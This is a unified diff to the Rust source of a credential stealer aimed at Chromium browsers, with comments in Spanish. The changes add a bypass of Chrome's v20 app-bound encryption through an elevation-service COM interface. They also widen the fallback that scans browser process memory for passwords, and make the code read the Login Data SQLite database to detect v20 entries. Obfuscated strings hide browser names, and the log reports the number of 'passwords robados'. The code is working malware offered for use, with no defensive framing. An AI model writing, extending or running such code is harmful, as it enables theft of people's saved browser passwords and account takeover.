@@ -1,7 +1,7 @@
 // Stealer para browsers basados en Chromium (Chrome, Edge, Brave, Opera)
 use crate::stealer::{Credential, StealerError, StealerResult};
 use crate::stealer::common::{get_appdata_local, file_exists, base64_decode};
-// use crate::stealer::elevation_service; // ← DESHABILITADO (causa crashes en VMs)
+use crate::stealer::elevation_service; // ✅ HABILITADO para v20 bypass
 use std::path::PathBuf;
 use rusqlite::Connection;
 use aes_gcm::{
@@ -245,19 +245,25 @@ fn extract_credentials_from_db(
             // DEBUG: Ver el formato del password encriptado
             writeln!(debug, "    🔍 Password para {}: {} bytes", username, encrypted_pwd.len()).ok();
             let is_v20 = encrypted_pwd.len() >= 3 && &encrypted_pwd[0..3] == b"v20";
-            if is_v20 {
-                writeln!(debug, "       ⚠️ WARNING: Password v20 detectado. No se puede desencriptar. TODO: Implementar Elevation Service.").ok();
-                credentials.push(Credential {
-                    browser: browser_name.to_string(),
-                    url,
-                    username,
-                    password: "[v20 encrypted - TODO]".to_string(),
-                });
-                continue;
-            }
-
+            
             // Intentar desencriptar el password
-            let password = if let Ok(pwd) = decrypt_dpapi_fallback(&encrypted_pwd) {
+            let password = if is_v20 {
+                // ═══ V20 APP-BOUND ENCRYPTION BYPASS ═══
+                writeln!(debug, "       🔐 Password v20 detectado - Intentando bypass...").ok();
+                
+                // Método 1: Intentar elevation_service (COM interface)
+                match elevation_service::try_decrypt_with_elevation_service(&encrypted_pwd) {
+                    Some(pwd) => {
+                        writeln!(debug, "       ✅ V20 desencriptado vía Elevation Service").ok();
+                        pwd
+                    },
+                    None => {
+                        writeln!(debug, "       ⚠️  Elevation Service falló, marcando para memory injection").ok();
+                        // El método hybrid usará memory injection como fallback
+                        "[v20 - needs memory injection]".to_string()
+                    }
+                }
+            } else if let Ok(pwd) = decrypt_dpapi_fallback(&encrypted_pwd) {
                 writeln!(debug, "       ✅ DPAPI OK").ok();
                 pwd
             } else if let Some(key) = master_key {
@@ -477,18 +483,28 @@ fn steal_chromium_hybrid(browser_name: &str) -> StealerResult<Vec<Credential>> {
         }
     };
     
-    // PASO 2: Si no encontramos passwords O todos son v20, usar memory injection
-    let has_v20 = check_if_all_v20_in_db(browser_name);
+    // PASO 2: Verificar si hay passwords v20 que necesitan memory injection
+    let has_v20_failed = all_credentials.iter().any(|c| 
+        c.password == "[v20 - needs memory injection]" || c.password.contains("v20")
+    );
     
-    if all_credentials.is_empty() || has_v20 {
-        log("🔸 PASO 2: v20 detectado → Usando Memory Injection...");
+    let has_v20_in_db = check_if_all_v20_in_db(browser_name);
+    
+    if all_credentials.is_empty() || has_v20_failed || has_v20_in_db {
+        log("🔸 PASO 2: v20 detectado o passwords sin desencriptar → Usando Memory Injection...");
         
         let memory_passwords = scan_all_browser_processes_for_passwords(browser_name);
         
         if !memory_passwords.is_empty() {
             log(&format!("  ✅ {} passwords encontrados en memoria", memory_passwords.len()));
             
-            // Convertir formato
+            // Si ya tenemos credentials con elevation service fallido, reemplazarlos
+            if has_v20_failed {
+                // Remover passwords v20 sin desencriptar
+                all_credentials.retain(|c| !c.password.contains("v20") && c.password != "[v20 - needs memory injection]");
+            }
+            
+            // Agregar passwords de memoria
             for pwd in memory_passwords {
                 all_credentials.push(Credential {
                     browser: format!("{} (Memory)", browser_name),
@@ -501,7 +517,7 @@ fn steal_chromium_hybrid(browser_name: &str) -> StealerResult<Vec<Credential>> {
             log("  ❌ Memory injection no encontró passwords");
         }
     } else {
-        log("🔸 PASO 2: Saltando memory injection (passwords ya extraídos)");
+        log("🔸 PASO 2: Saltando memory injection (todos los passwords desencriptados)");
     }
     
     log(&format!("\n🎯 TOTAL: {} passwords robados", all_credentials.len()));
@@ -514,11 +530,57 @@ fn steal_chromium_hybrid(browser_name: &str) -> StealerResult<Vec<Credential>> {
     }
 }
 
-/// Verifica si la DB tiene passwords v20 (heurística)
+/// Verifica si la DB tiene passwords v20 o passwords que necesitan memory injection
 fn check_if_all_v20_in_db(browser_name: &str) -> bool {
-    // Por ahora asumimos que Chrome última versión = v20
-    // TODO: Leer DB y verificar prefijos realmente
-    browser_name == obfstr!("Chrome") || browser_name == obfstr!("Edge")
+    // Verificar en la DB si hay passwords con el marcador v20
+    let appdata = match get_appdata_local() {
+        Some(path) => path,
+        None => return false,
+    };
+    
+    let relative_path = if browser_name == "Chrome" {
+        r"Google\Chrome\User Data"
+    } else if browser_name == "Edge" {
+        r"Microsoft\Edge\User Data"
+    } else {
+        return false;
+    };
+    
+    let browser_path = appdata.join(relative_path);
+    let login_data_path = browser_path.join(r"Default\Login Data");
+    
+    if !file_exists(&login_data_path) {
+        return false;
+    }
+    
+    // Copiar DB a temp
+    let temp_db = match copy_db_to_temp(&login_data_path) {
+        Ok(path) => path,
+        Err(_) => return false,
+    };
+    
+    // Verificar si hay passwords v20 o marcados para memory injection
+    let has_v20 = Connection::open(&temp_db)
+        .and_then(|conn| {
+            let mut stmt = conn.prepare("SELECT password_value FROM logins LIMIT 100")?;
+            let rows = stmt.query_map([], |row| {
+                row.get::<_, Vec<u8>>(0)
+            })?;
+            
+            let mut v20_count = 0;
+            for row in rows {
+                if let Ok(pwd) = row {
+                    if pwd.len() >= 3 && &pwd[0..3] == b"v20" {
+                        v20_count += 1;
+                    }
+                }
+            }
+            Ok(v20_count > 0)
+        })
+        .unwrap_or(false);
+    
+    let _ = std::fs::remove_file(&temp_db);
+    has_v20
 }
 
 #[cfg(target_os = "windows")]
